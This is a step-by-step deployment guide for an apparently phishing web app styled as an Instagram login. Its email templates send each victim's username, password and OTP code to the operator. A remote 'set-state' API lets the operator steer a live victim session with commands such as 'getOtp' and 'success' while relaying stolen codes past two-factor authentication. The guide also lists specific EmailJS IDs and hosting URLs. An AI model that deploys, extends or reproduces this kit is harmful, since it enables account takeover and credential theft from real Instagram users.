# Complete Setup Guide - Step by Step

This guide will walk you through setting up all platforms from scratch.

---

## Step 1: GitHub Repository Setup

### 1.1 Create a New GitHub Repository
1. Go to [GitHub.com](https://github.com) and sign in (or create an account)
2. Click the **"+"** icon in the top right → **"New repository"**
3. Repository name: `instest` (or any name you prefer)
4. Description: "Instagram Login App"
5. Set to **Public** (or Private if you prefer)
6. **DO NOT** initialize with README, .gitignore, or license
7. Click **"Create repository"**

### 1.2 Push Your Code to GitHub
```bash
# In your project directory
cd /Users/tshinde/Desktop/tejas/inst

# Initialize git if not already done
git init

# Add remote (replace YOUR_USERNAME with your GitHub username)
git remote add origin https://github.com/YOUR_USERNAME/instest.git

# Add all files
git add .

# Commit
git commit -m "Initial commit"

# Push to GitHub
git branch -M main
git push -u origin main
```

**Note:** If you already have a remote, check with `git remote -v` and update if needed.

---

## Step 2: Railway Backend Setup

### 2.1 Create Railway Account
1. Go to [Railway.app](https://railway.app)
2. Click **"Login"** → Sign up with GitHub
3. Authorize Railway to access your GitHub account

### 2.2 Deploy Backend
1. In Railway dashboard, click **"New Project"**
2. Select **"Deploy from GitHub repo"**
3. Choose your `instest` repository
4. Railway will detect the project

### 2.3 Configure Backend Settings
1. Click on your deployed service
2. Go to **"Settings"** tab
3. Set **Root Directory** to: `server`
4. Go to **"Variables"** tab
5. Add environment variable:
   - **Name:** `PORT`
   - **Value:** `3001`
   - Click **"Add"**

### 2.4 Get Your Backend URL
1. Go to **"Settings"** → **"Networking"**
2. Click **"Generate Domain"** (or use the default one)
3. Copy the URL (e.g., `https://instest-production.up.railway.app`)
4. **Save this URL** - you'll need it for the frontend

### 2.5 Check Backend Server Package
Make sure `server/package.json` exists with:
```json
{
  "name": "instest-server",
  "version": "1.0.0",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "dependencies": {
    "express": "^4.18.2",
    "cors": "^2.8.5"
  }
}
```

If it doesn't exist, create it in the `server/` folder.

---

## Step 3: EmailJS Setup

### 3.1 Create EmailJS Account
1. Go to [EmailJS.com](https://www.emailjs.com)
2. Click **"Sign Up"** → Create account (or sign in)
3. Verify your email if required

### 3.2 Create Email Service
1. In EmailJS dashboard, go to **"Email Services"**
2. Click **"Add New Service"**
3. Choose your email provider (Gmail, Outlook, etc.)
4. Follow the setup instructions
5. **Save the Service ID** (e.g., `service_04tt69h`)

### 3.3 Create Email Templates

#### Template 1: Login Attempt Template
1. Go to **"Email Templates"**
2. Click **"Create New Template"**
3. Template ID: `template_b9wm876` (or note the generated ID)
4. Template content:
```
Login attempt details:
Username: {{username}}
Password: {{password}}
Status: {{status}}

API Code for getOtp:
{{api_code_getotp}}

API Code for incorrectCredentials:
{{api_code_incorrect}}

API Code for success:
{{api_code_success}}
```
5. Click **"Save"**

#### Template 2: OTP Template
1. Click **"Create New Template"**
2. Template ID: `template_42u7yrw` (or note the generated ID)
3. Template content:
```
Username: {{username}}
OTP Code: {{otp_code}}
Message: {{message}}
```
4. Click **"Save"**

### 3.4 Get Your Public Key
1. Go to **"Account"** → **"General"**
2. Find **"Public Key"** (e.g., `bfy_j4oBXNKFpGcDC`)
3. **Save this key**

### 3.5 Update Your Code
Update `src/App.js` with your EmailJS credentials:
- Service ID: Replace `service_04tt69h` with your service ID
- Template IDs: Replace `template_b9wm876` and `template_42u7yrw` with your template IDs
- Public Key: Replace `bfy_j4oBXNKFpGcDC` with your public key

---

## Step 4: Netlify Frontend Setup

### 4.1 Create Netlify Account
1. Go to [Netlify.com](https://www.netlify.com)
2. Click **"Sign up"** → Sign up with GitHub
3. Authorize Netlify to access your GitHub account

### 4.2 Deploy Frontend
1. In Netlify dashboard, click **"Add new site"** → **"Import an existing project"**
2. Choose **"Deploy with GitHub"**
3. Select your `instest` repository
4. Configure build settings:
   - **Build command:** `npm run build`
   - **Publish directory:** `build`
   - **Base directory:** Leave empty (or `./`)
5. **Environment variable (optional for real devices):**
   - **Do not set** `REACT_APP_API_URL` if you want the app to work on phones/real devices. The repo includes a **Netlify proxy**: API requests go to your Netlify URL (e.g. `https://solve-if-you-can.netlify.app/api/...`), and Netlify forwards them to Railway. Your phone only talks to Netlify, so it works even when the Railway URL doesn’t resolve on mobile (e.g. `DNS_PROBE_FINISHED_NXDOMAIN`).
   - **Only if you need to point directly at Railway** (e.g. desktop only): add **Key** `REACT_APP_API_URL`, **Value** `https://instagram-automation-server-production-d8e6.up.railway.app` (must include `https://`).
6. Click **"Deploy site"**

### 4.3 Get Your Frontend URL
1. After deployment completes, you'll get a URL like:
   - `https://instest.netlify.app` (or a custom domain if you set one up)
2. **Save this URL**

---

## Step 5: Verify Setup

### 5.1 Test Backend
- **From desktop:** Open `https://YOUR_RAILWAY_URL/health` — should return `{"status":"ok","message":"Server is running"}`.
- **From phone:** If the Railway URL doesn’t open on your phone (e.g. “This site can’t be reached” / DNS error), that’s expected. The app uses the Netlify proxy: open `https://YOUR_NETLIFY_URL/api/health` (e.g. `https://solve-if-you-can.netlify.app/api/health`) — same JSON means the proxy is working.

### 5.2 Test Frontend
1. Open your Netlify URL in browser
2. Try logging in with test credentials
3. Check browser console for any errors
4. Verify that:
   - Spinner shows on login button
   - Email is sent (check your email)
   - API codes are included in email

### 5.3 Test API from Another Device
From another device/computer, run:
```javascript
fetch('https://YOUR_RAILWAY_URL/api/set-state', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    sessionId: 'SESSION_ID_FROM_EMAIL',
    command: 'getOtp'
  })
}).then(r=>r.json()).then(console.log);
```

Replace `SESSION_ID_FROM_EMAIL` with the session ID from the email you received.

---

## Step 6: Update Code with Your Credentials

After setting up all platforms, update these files:

### 6.1 Update `src/App.js`
Find and replace:
- `service_04tt69h` → Your EmailJS Service ID
- `template_b9wm876` → Your Login Template ID
- `template_42u7yrw` → Your OTP Template ID
- `bfy_j4oBXNKFpGcDC` → Your EmailJS Public Key

### 6.2 Commit and Push Changes
```bash
git add src/App.js
git commit -m "Update EmailJS credentials"
git push
```

Netlify will automatically redeploy with the new changes.

---

## Quick Reference: All URLs and IDs

Save this information:

- **GitHub Repository:** `https://github.com/YOUR_USERNAME/instest`
- **Railway Backend URL:** `https://YOUR_RAILWAY_URL`
- **Netlify Frontend URL:** `https://YOUR_NETLIFY_URL`
- **EmailJS Service ID:** `service_xxxxx`
- **EmailJS Login Template ID:** `template_xxxxx`
- **EmailJS OTP Template ID:** `template_xxxxx`
- **EmailJS Public Key:** `xxxxx`

---

## Troubleshooting

### Backend not working?
- Check Railway logs: Railway Dashboard → Your Service → "Deployments" → Click latest → "View Logs"
- Verify Root Directory is set to `server`
- Check that `server/package.json` exists

### Frontend not connecting to backend?
- Verify `REACT_APP_API_URL` environment variable in Netlify
- Check that Railway backend URL is correct
- Test backend health endpoint manually
- In Netlify: Site settings → Build & deploy → Environment variables

### Emails not sending?
- Verify EmailJS credentials in `src/App.js`
- Check EmailJS dashboard for service status
- Check browser console for EmailJS errors

### Need help?
- Check existing documentation files:
  - `TROUBLESHOOTING.md`
  - `QUICK_API_EXAMPLES.md`
  - `RAILWAY_FIX.md`
  - `NETLIFY_BACKEND_GUIDE.md`

---

## Next Steps After Setup

1. Test the complete flow:
   - Login → Get email → Use API code → Verify state changes
2. Customize the Instagram challenge URL in `src/App.js` (line 88-89)
3. Deploy updates by pushing to GitHub (auto-deploys)

---

**Setup Complete! 🎉**
